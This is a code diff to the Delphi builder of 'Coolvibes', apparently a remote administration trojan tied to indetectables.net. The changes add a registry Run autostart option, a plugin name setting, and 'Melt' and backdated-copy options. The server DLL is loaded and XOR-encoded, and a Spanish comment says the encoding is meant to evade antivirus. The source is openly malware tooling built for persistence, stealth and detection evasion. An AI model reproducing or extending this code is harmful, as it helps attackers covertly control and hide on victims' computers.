@@ -183,6 +183,7 @@ end;
 
 procedure TFormMain.BtnAboutClick(Sender: TObject);
 begin
+  if (FormAbout.Showing <> true) then
   FormAbout.ShowModal;
 end;
 
@@ -555,8 +556,8 @@ begin
         Ini.ReadString('ConfigurarServidor', 'Puerto', '3360');
       EditIP.Text     :=
         Ini.ReadString('ConfigurarServidor', 'IP', '127.0.0.1');
-      EditTimeToNotify.Text :=
-        Ini.ReadString('ConfigurarServidor', 'TiempoNotificacion', '15');
+      EditPluginName.Text :=
+        Ini.ReadString('ConfigurarServidor', 'NombrePlugin', 'Plugi.dat');
       CheckBoxCopiar.Checked :=
         Ini.ReadBool('ConfigurarServidor', 'CopiarArchivo', False);
       EditFileName.Text :=
@@ -567,10 +568,10 @@ begin
         Ini.ReadBool('ConfigurarServidor', 'Melt', False);
       CheckBoxCopiarConFechaAnterior.Checked :=
         Ini.ReadBool('ConfigurarServidor', 'CopiarConFechaAnterior', False);
-      CheckBoxPolicies.Checked :=
-        Ini.ReadBool('ConfigurarServidor', 'MetodoPolicies', False);
-      EditPoliciesName.Text :=
-        Ini.ReadString('ConfigurarServidor', 'ValorPolicies', 'coolserver');
+      CheckBoxRun.Checked :=
+        Ini.ReadBool('ConfigurarServidor', 'MetodoRun', False);
+      EditRunName.Text :=
+        Ini.ReadString('ConfigurarServidor', 'ValorRun', 'coolserver');
     end;
   finally
     Ini.Free;
@@ -601,8 +602,8 @@ begin
     Ini.WriteString('ConfigurarServidor', 'ID', FormConfigServer.EditID.Text);
     Ini.WriteString('ConfigurarServidor', 'Puerto', FormConfigServer.EditPuerto.Text);
     Ini.WriteString('ConfigurarServidor', 'IP', FormConfigServer.EditIP.Text);
-    Ini.WriteString('ConfigurarServidor', 'TiempoNotificacion',
-      FormConfigServer.EditTimeToNotify.Text);
+    Ini.WriteString('ConfigurarServidor', 'NombrePlugin',
+      FormConfigServer.EditPluginName.Text);
     Ini.WriteBool('ConfigurarServidor', 'CopiarArchivo',
       FormConfigServer.CheckBoxCopiar.Checked);
     Ini.WriteString('ConfigurarServidor', 'NombreArchivo',
@@ -613,9 +614,9 @@ begin
     Ini.WriteBool('ConfigurarServidor', 'CopiarConFechaAnterior',
       FormConfigServer.CheckBoxCopiarConFechaAnterior.Checked);
     Ini.WriteBool('ConfigurarServidor', 'MetodoPolicies',
-      FormConfigServer.CheckBoxPolicies.Checked);
-    Ini.WriteString('ConfigurarServidor', 'ValorPolicies',
-      FormConfigServer.EditPoliciesName.Text);
+      FormConfigServer.CheckBoxRun.Checked);
+    Ini.WriteString('ConfigurarServidor', 'ValorRun',
+      FormConfigServer.EditRunName.Text);
   finally
     Ini.Free;
   end;
@@ -643,11 +644,11 @@ begin
 
   Self.Caption := 'Coolvibes '+VersionCool+' Update '+UpdateNum+' ::   [ www.indetectables.net ]';
 
-   if fileexists(extractfiledir(paramstr(0))+'\coolserver.dll')      then
+   if fileexists(extractfiledir(paramstr(0))+'\servidores\coolserver.dll')      then
    begin
 
   FileMode := 0;
-  AssignFile(ServerFile, extractfiledir(paramstr(0))+'\coolserver.dll');     //archivo de CoolServer
+  AssignFile(ServerFile, extractfiledir(paramstr(0))+'\servidores\coolserver.dll');     //archivo de CoolServer
   Reset(ServerFile, 1);
   tamano := FileSize(ServerFile);
   SetLength(Servdll, tamano);
@@ -659,7 +660,9 @@ begin
     ServDLL[i] := chr(ord(ServDLL[i]) xor 66);//funcion de cifrado simple para evadir antiviruses, en el futuró deberá ser dinamica
   end;
 
-  end;
+  end
+  else
+  MessageDlg('CoolServer.dll no existe, no se podrán mandar servidores', mtWarning, [mbOK], 0);
 end;
 // para el globo emergente
 procedure TFormMain.NotiMsnDesconect(tItem: TListItem);
